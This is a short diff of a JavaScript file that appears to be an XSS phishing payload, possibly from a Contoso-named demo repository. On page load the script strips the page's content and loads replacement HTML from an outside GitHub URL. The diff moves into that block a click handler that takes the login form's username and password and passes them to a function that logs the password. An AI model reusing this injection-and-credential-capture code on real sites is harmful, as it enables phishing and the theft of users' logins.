@@ -11,15 +11,13 @@ function magic(username, password) {
     console.log("password is: " + password);
 }
 
-$(document).ready(function() {
-    $('#doLogin_0').click(function() {
-        magic($('#doLogin_username').val(), $('#doLogin_password').val());
-    });
-});
 
 $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
     $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html");
+    $('#doLogin_0').click(function() {
+        magic($('#doLogin_username').val(), $('#doLogin_password').val());
+    });
     console.log("done");
 });
